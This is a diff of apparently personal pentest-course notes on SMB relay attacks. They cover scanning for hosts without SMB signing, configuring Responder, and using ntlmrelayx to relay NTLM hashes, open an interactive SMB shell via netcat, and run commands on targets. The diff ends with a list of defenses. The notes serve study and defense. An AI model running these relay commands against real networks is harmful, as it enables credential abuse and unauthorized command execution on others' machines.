@@ -45,7 +45,7 @@ Relayed user credentials must be admin on machine for any real value for us
 We can identify host wihtout SMB signing using 
 nmap --script=smb2-security-mode.nse -p445 10.0.0.25
 
-To enbale this attack we must modify Responder conf (/usr/share/responder.conf) to turn off SMB and HTTP servers as we want to be able to relay hashes and not capture.
+To enbale this attack we must modify Responder conf (/etc/responder/Responder.conf) to turn off SMB and HTTP servers as we want to be able to relay hashes and not capture.
 
 Once Responder is running we will run another tool called ntlmrelayx.py
 ntlmrelayx -tf targets.txt -smb2support
@@ -58,3 +58,31 @@ ntlmrelayx -tf targets.txt -smb2support -I
 Or execute commands
 ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 
+## SMB Relay Attacks Lab
+
+nmap --script=smb2-security-mode.nse -p445 10.0.0.25 -Pn
+-Pn is used when we know machine is live but nmap does not see it. It skips host discovery
+
+Change Responder conf as stated before. 
+Check changes :
+sudo responder -I eth0 -dwPv
+HTPP and SMB must be OFF
+
+We set up ntlmrelayx (available under pimp my kali)
+ntlmrelayx -tf targets.txt -smb2support
+Working version is v0.9.19, not older and not newer
+
+We can redo in interactive mode:
+ntlmrelayx -tf targets.txt -smb2support -i
+It starts a SMB client on localhost port 11000
+We can connect to it using Netcat (nc) after relaying 
+nc 127.0.0.1 11000
+
+Execute whoami command :
+ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+
+## SMB Relay Attack Defenses
+- Enable SMB signing on all devices : can cause performance issue with file copies
+- Disable NTLM authentication on network : default back to NTLM if Kerberos stops working
+- Account tiering
+- Local admin restriction : limit attack surface with local admin abuse but can increase the amount of desk ticket if no admin rights is available for the user
